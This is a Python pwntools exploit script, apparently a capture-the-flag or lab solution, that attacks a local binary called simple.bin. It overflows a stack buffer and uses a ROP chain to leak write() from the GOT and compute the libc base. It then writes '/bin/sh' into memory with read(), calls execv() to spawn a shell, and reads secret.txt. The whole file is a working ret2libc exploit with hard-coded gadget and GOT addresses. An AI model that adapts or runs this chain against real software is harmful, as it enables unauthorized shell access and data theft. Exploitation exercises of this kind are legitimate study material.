#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./simple.bin")
    #input("pause")

    rop = ROP("./simple.bin")
    #print(rop.rdi, rop.rsi)
    rdi_gadget = p64(0x400673)
    rsi_gadget = p64(0x400671) # Warning : 0x400671: pop %rsi; pop %r15; ret. Be careful of pop %r15
    msg_addr = p64(0x601060)
    bin_sh = b"/bin/sh\x00"

    # Investigate the libc library.
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    write_offset = libc.symbols['write']
    read_offset = libc.symbols['read']
    execv_offset = libc.symbols['execv']

    p.recvline()
    # 0x601018 : The GOT entry of write() system call.
    # 0x400470 : The address of write@plt
    # 0x4005d8 : The address of instruction which prepare arguments for read() and call read(). (In the function f)
    p.sendline(b"a"*0x18 + rdi_gadget + p64(0x1) + rsi_gadget + p64(0x601018) + p64(0x1) + p64(0x400470) + p64(0x4005d8))
    #input("pause")
    write_addr = int.from_bytes(p.recv(8), 'little')
    base_addr = write_addr - write_offset # base_addr is a decimal integer.
    read_addr = base_addr + read_offset
    read_byte_addr = read_addr.to_bytes(8, byteorder='little')
    execv_addr = base_addr + execv_offset
    execv_byte_addr = execv_addr.to_bytes(8, byteorder='little')

    p.sendline(b"a"*0x18 + rdi_gadget + p64(0x0) + rsi_gadget + msg_addr + p64(0x1) + read_byte_addr + 
               rdi_gadget + msg_addr + rsi_gadget + p64(0x0) + p64(0x0) + execv_byte_addr)
    #input("pause")
    sleep(0.2)
    p.sendline(bin_sh)
    #input("pause")
    sleep(0.2)
    p.recv(136)
    p.sendline(b"cat secret.txt")
    print(p.recvline())

if __name__ == "__main__":
    exploit()
